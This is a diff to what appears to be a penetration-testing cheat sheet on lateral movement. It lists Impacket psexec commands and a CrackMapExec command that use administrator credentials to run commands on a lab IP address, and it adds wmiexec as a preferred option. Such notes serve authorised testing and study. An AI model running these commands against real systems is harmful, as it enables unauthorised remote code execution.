@@ -35,7 +35,7 @@ Metasploit PsExec    # Ruby PsExec, runs as SYSTEM via Meterpreter.
 #### Impacket PsExec Examples
 impacket-psexec administrator:'Password123!'@10.10.110.17        # Local  
 impacket-psexec domain/administrator:'Password123!'@10.10.110.17 # Domain   
-# Same syntax applies to impacket-smbexec and impacket-atexec
+# Same syntax applies to impacket-smbexec, impacket-atexec, impacket-wmiexec (best)
 
 ####  CrackMapExec
 crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec  
